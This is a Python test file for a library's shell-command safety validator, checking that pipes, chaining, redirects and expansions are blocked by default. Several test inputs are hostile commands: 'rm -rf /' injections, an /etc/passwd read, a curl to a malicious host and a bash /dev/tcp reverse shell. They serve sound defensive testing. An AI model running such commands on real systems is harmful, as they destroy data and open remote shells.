#
# SPDX-FileCopyrightText: Copyright (c) provide.io llc. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#

"""Tests for shell command validation and safety checks."""

from __future__ import annotations

from provide.testkit import FoundationTestCase
import pytest

from provide.foundation.errors.process import ProcessError
from provide.foundation.process.validation import (
    DANGEROUS_SHELL_PATTERNS,
    ShellFeatureError,
    validate_shell_safety,
)


class TestDangerousPatterns(FoundationTestCase):
    """Test dangerous pattern constants."""

    def test_dangerous_patterns_list(self) -> None:
        """Test dangerous patterns list is comprehensive."""
        assert ";" in DANGEROUS_SHELL_PATTERNS
        assert "&&" in DANGEROUS_SHELL_PATTERNS
        assert "||" in DANGEROUS_SHELL_PATTERNS
        assert "|" in DANGEROUS_SHELL_PATTERNS
        assert ">" in DANGEROUS_SHELL_PATTERNS
        assert "<" in DANGEROUS_SHELL_PATTERNS
        assert "&" in DANGEROUS_SHELL_PATTERNS
        assert "$" in DANGEROUS_SHELL_PATTERNS
        assert "`" in DANGEROUS_SHELL_PATTERNS
        assert "(" in DANGEROUS_SHELL_PATTERNS
        assert ")" in DANGEROUS_SHELL_PATTERNS


class TestShellFeatureError(FoundationTestCase):
    """Test ShellFeatureError exception."""

    def test_shell_feature_error_creation(self) -> None:
        """Test creating ShellFeatureError."""
        error = ShellFeatureError(
            "Shell feature not allowed",
            pattern="|",
            command="cat file | grep pattern",
        )

        assert error.pattern == "|"
        assert error.command == "cat file | grep pattern"
        assert "Shell feature not allowed" in str(error)

    def test_shell_feature_error_inherits_process_error(self) -> None:
        """Test ShellFeatureError inherits from ProcessError."""
        error = ShellFeatureError("test", pattern="|", command="test")
        assert isinstance(error, ProcessError)

    def test_shell_feature_error_truncates_long_command(self) -> None:
        """Test ShellFeatureError truncates command to 100 chars."""
        long_cmd = "a" * 200
        error = ShellFeatureError("test", pattern="|", command=long_cmd)

        # Command should be truncated to 100 chars
        assert len(error.command) == 100


class TestValidateShellSafety(FoundationTestCase):
    """Test validate_shell_safety function."""

    def test_safe_commands_pass(self) -> None:
        """Test that safe commands pass validation."""
        safe_commands = [
            "ls",
            "ls -la",
            "echo hello",
            "pwd",
            "whoami",
            "date",
            "cat filename.txt",
            "grep pattern file.txt",
            "python script.py",
            "node index.js",
        ]

        for cmd in safe_commands:
            # Should not raise
            validate_shell_safety(cmd, allow_shell_features=False)

    def test_dangerous_semicolon_denied(self) -> None:
        """Test semicolon command chaining is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("ls; rm -rf /", allow_shell_features=False)

        assert exc_info.value.pattern == ";"
        assert "allow_shell_features=True" in str(exc_info.value)

    def test_dangerous_double_ampersand_denied(self) -> None:
        """Test && conditional execution is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("make && make install", allow_shell_features=False)

        assert exc_info.value.pattern == "&&"

    def test_dangerous_pipe_denied(self) -> None:
        """Test pipe operator is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("cat file.txt | grep pattern", allow_shell_features=False)

        assert exc_info.value.pattern == "|"

    def test_dangerous_redirect_denied(self) -> None:
        """Test output redirection is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("echo data > file.txt", allow_shell_features=False)

        assert exc_info.value.pattern == ">"

    def test_dangerous_input_redirect_denied(self) -> None:
        """Test input redirection is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("python < input.txt", allow_shell_features=False)

        assert exc_info.value.pattern == "<"

    def test_dangerous_background_denied(self) -> None:
        """Test background execution is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("sleep 100 &", allow_shell_features=False)

        assert exc_info.value.pattern == "&"

    def test_dangerous_variable_expansion_denied(self) -> None:
        """Test variable expansion is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("echo $HOME", allow_shell_features=False)

        assert exc_info.value.pattern == "$"

    def test_dangerous_command_substitution_denied(self) -> None:
        """Test command substitution is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("echo `whoami`", allow_shell_features=False)

        assert exc_info.value.pattern == "`"

    def test_dangerous_subshell_denied(self) -> None:
        """Test subshell execution is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("(cd /tmp)", allow_shell_features=False)

        assert exc_info.value.pattern == "("

    def test_dangerous_glob_denied(self) -> None:
        """Test glob expansion is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("rm *.txt", allow_shell_features=False)

        assert exc_info.value.pattern == "*"

    def test_dangerous_question_mark_denied(self) -> None:
        """Test glob question mark is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("ls file?.txt", allow_shell_features=False)

        assert exc_info.value.pattern == "?"

    def test_dangerous_tilde_denied(self) -> None:
        """Test tilde expansion is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("cd ~/documents", allow_shell_features=False)

        assert exc_info.value.pattern == "~"

    def test_dangerous_newline_denied(self) -> None:
        """Test newline injection is denied."""
        with pytest.raises(ShellFeatureError) as exc_info:
            validate_shell_safety("ls\nrm -rf /", allow_shell_features=False)

        assert exc_info.value.pattern == "\n"

    def test_allow_shell_features_bypasses_validation(self) -> None:
        """Test allow_shell_features=True allows dangerous patterns."""
        dangerous_commands = [
            "ls; pwd",
            "make && make install",
            "cat file | grep pattern",
            "echo data > file.txt",
            "sleep 10 &",
            "echo $HOME",
            "echo `date`",
            "(cd /tmp && ls)",
            "rm *.txt",
            "cd ~/documents",
        ]

        for cmd in dangerous_commands:
            # Should not raise when allowed
            validate_shell_safety(cmd, allow_shell_features=True)

    def test_common_injection_attempts(self) -> None:
        """Test common command injection attack vectors are blocked."""
        injection_attempts = [
            # SQL-style injection
            "ls; DROP TABLE users",
            # Path traversal with command
            "cat ../../etc/passwd",
            # Multi-command injection
            "ping -c 1 example.com && curl malicious.com",
            # Reverse shell attempt
            "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        ]

        for attack in injection_attempts:
            # All should be blocked (they contain dangerous patterns)
            if any(pattern in attack for pattern in DANGEROUS_SHELL_PATTERNS):
                with pytest.raises(ShellFeatureError):
                    validate_shell_safety(attack, allow_shell_features=False)


class TestShellFunctionIntegration(FoundationTestCase):
    """Test shell() functions with validation."""

    @pytest.mark.asyncio
    async def test_sync_shell_safe_command(self) -> None:
        """Test sync shell with safe command succeeds."""
        from provide.foundation.process.sync.shell import shell

        result = shell("echo hello")
        assert result.returncode == 0
        assert "hello" in result.stdout

    @pytest.mark.asyncio
    async def test_sync_shell_dangerous_command_denied(self) -> None:
        """Test sync shell denies dangerous command by default."""
        from provide.foundation.process.sync.shell import shell

        with pytest.raises(ShellFeatureError):
            shell("echo hello | grep h")

    @pytest.mark.asyncio
    async def test_sync_shell_dangerous_command_allowed(self) -> None:
        """Test sync shell allows dangerous command with flag."""
        from provide.foundation.process.sync.shell import shell

        result = shell("echo hello | grep h", allow_shell_features=True)
        assert result.returncode == 0
        assert "hello" in result.stdout

    @pytest.mark.asyncio
    async def test_async_shell_safe_command(self) -> None:
        """Test async shell with safe command succeeds."""
        from provide.foundation.process.aio.shell import async_shell

        result = await async_shell("echo hello")
        assert result.returncode == 0
        assert "hello" in result.stdout

    @pytest.mark.asyncio
    async def test_async_shell_dangerous_command_denied(self) -> None:
        """Test async shell denies dangerous command by default."""
        from provide.foundation.process.aio.shell import async_shell

        with pytest.raises(ShellFeatureError):
            await async_shell("echo hello | grep h")

    @pytest.mark.asyncio
    async def test_async_shell_dangerous_command_allowed(self) -> None:
        """Test async shell allows dangerous command with flag."""
        from provide.foundation.process.aio.shell import async_shell

        result = await async_shell("echo hello | grep h", allow_shell_features=True)
        assert result.returncode == 0
        assert "hello" in result.stdout


# 🧱🏗️🔚
